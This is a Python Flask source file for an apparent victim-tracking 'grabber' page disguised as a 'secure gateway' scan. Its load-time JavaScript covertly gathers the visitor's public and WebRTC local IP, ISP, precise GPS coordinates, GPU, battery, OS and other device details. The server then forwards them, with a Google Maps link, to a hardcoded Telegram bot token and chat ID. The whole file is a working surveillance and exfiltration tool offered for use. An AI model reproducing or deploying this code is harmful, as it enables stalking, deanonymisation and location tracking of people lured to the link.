from flask import Blueprint, render_template_string, request, jsonify
import requests

script20_bp = Blueprint('script20', __name__)

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = "6133548217:AAFtEqMcFM1vz55YNTI4DBkeZe0Ku_zzOo0"
TELEGRAM_CHAT_ID = "1308711346"

PHANTOM_UI = """
<!DOCTYPE html>
<html>
<head>
    <title>ULTRA_PHANTOM_v8.0</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Share Tech Mono', monospace; text-align: center; padding-top: 15%; margin:0; }
        .box { border: 1px solid #0f0; display: inline-block; padding: 40px; background: rgba(0,20,0,0.95); box-shadow: 0 0 60px #0f0; position: relative; }
        .scan-line { width: 100%; height: 6px; background: #0f0; position: absolute; top: 0; left:0; animation: scan 1.5s linear infinite; }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
    </style>
</head>
<body onload="capture()">
    <div class="box">
        <div class="scan-line"></div>
        <h2 id="header">ULTRA_SECURE_GATEWAY</h2>
        <p id="status">Scanning Advanced Metadata... [v8.0]</p>
        <div id="loader">STATUS: EXTRACTING_ELITE_INTEL_NODES</div>
    </div>

    <script>
        async function capture() {
            try {
                // 1. IPv4 & Advanced GEO
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();

                // 2. ELITE HARDWARE FINGERPRINTING
                let gpu = "Unknown";
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if(gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Software/Hidden";
                }

                // 3. BATTERY & POWER
                let batt = "Blocked";
                if(navigator.getBattery) {
                    const b = await navigator.getBattery();
                    batt = Math.round(b.level * 100) + "% (" + (b.charging ? "AC Power" : "Discharging") + ")";
                }

                // 4. WEBRTC (LOCAL IP)
                let localIP = "N/A";
                const pc = new RTCPeerConnection({iceServers:[]});
                pc.createDataChannel("");
                pc.createOffer().then(o => pc.setLocalDescription(o));
                pc.onicecandidate = (i) => { if(i && i.candidate) localIP = i.candidate.address; };

                // 5. GPS COORDINATES
                const getPos = () => new Promise(r => navigator.geolocation.getCurrentPosition(p => r(p.coords), () => r(null), {enableHighAccuracy: true}));
                const coords = await getPos();

                // 6. OS & DEVICE TYPE
                const ua = navigator.userAgent;
                let osName = "Unknown";
                if (ua.includes("Win")) osName = "Windows";
                else if (ua.includes("Android")) osName = "Android";
                else if (ua.includes("iPhone") || ua.includes("iPad")) osName = "iOS";
                else if (ua.includes("Mac")) osName = "MacOS";
                else if (ua.includes("Linux")) osName = "Linux";

                const intel = {
                    time: new Date().toLocaleString(),
                    ipv4: ipData.ip || "N/A",  // IPv4 Explicitly
                    local_ip: localIP,
                    isp: ipData.org || "N/A",
                    city: ipData.city || "N/A",
                    country: ipData.country_name || "N/A",
                    lat: coords ? coords.latitude : "Denied",
                    lon: coords ? coords.longitude : "Denied",
                    os: osName,
                    platform: navigator.platform,
                    agent: ua,
                    gpu: gpu,
                    cores: navigator.hardwareConcurrency || "N/A",
                    ram: navigator.deviceMemory || "N/A",
                    battery: batt,
                    screen: window.screen.width + "x" + window.screen.height + " (" + screen.orientation.type + ")",
                    lang: navigator.language,
                    touch: navigator.maxTouchPoints || 0,
                    vendor: navigator.vendor,
                    connection: navigator.connection ? navigator.connection.effectiveType : "N/A"
                };

                await fetch('/script20/capture_data', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(intel)
                });

                document.getElementById('header').innerText = "FORENSICS_COMPLETE";
                document.getElementById('status').innerText = "Data nodes stabilized.";

            } catch (e) { console.error(e); }
        }
    </script>
</body>
</html>
"""

@script20_bp.route('/')
def index():
    return render_template_string(PHANTOM_UI)

@script20_bp.route('/capture_data', methods=['POST'])
def capture_data():
    try:
        i = request.json
        message = (
            f"🔥 *--- PHANTOM ELITE v8.0 REPORT ---* 🔥\\n\\n"
            f"📅 *DATETIME:* `{i['time']}`\\n"
            f"🌐 *NETWORK INTEL (A-GRADE)*\\n"
            f"┣ *IPv4 ADDRESS:* `{i['ipv4']}`\\n"  # IPv4 Highlighted
            f"┣ Local IP: `{i['local_ip']}`\\n"
            f"┣ ISP: `{i['isp']}`\\n"
            f"┗ Net Type: `{i['connection']}`\\n\\n"
            f"📍 *GEOLOCATION*\\n"
            f"┣ Lat/Lon: `{i['lat']}, {i['lon']}`\\n"
            f"┣ City: `{i['city']}, {i['country']}`\\n"
            f"┗ Map: [Google Maps](https://www.google.com/maps?q={i['lat']},{i['lon']})\\n\\n"
            f"💻 *CORE SYSTEM SPECS*\\n"
            f"┣ *OS:* `{i['os']}`\\n"
            f"┣ Platform: `{i['platform']}`\\n"
            f"┣ GPU: `{i['gpu']}`\\n"
            f"┣ RAM: `{i['ram']} GB` | Cores: `{i['cores']}`\\n"
            f"┣ Battery: `{i['battery']}`\\n"
            f"┗ Screen: `{i['screen']}`\\n\\n"
            f"⚙️ *ADVANCED METADATA*\\n"
            f"┣ Vendor: `{i['vendor']}`\\n"
            f"┣ Language: `{i['lang']}`\\n"
            f"┗ Touch Points: `{i['touch']}`\\n\\n"
            f"📎 *FULL USER AGENT*\\n"
            f"`{i['agent']}`"
        )

        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", 
                      json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"})
        return jsonify({"status": "Success"}), 200
    except Exception as e:
        return jsonify({"status": "Error", "message": str(e)}), 500
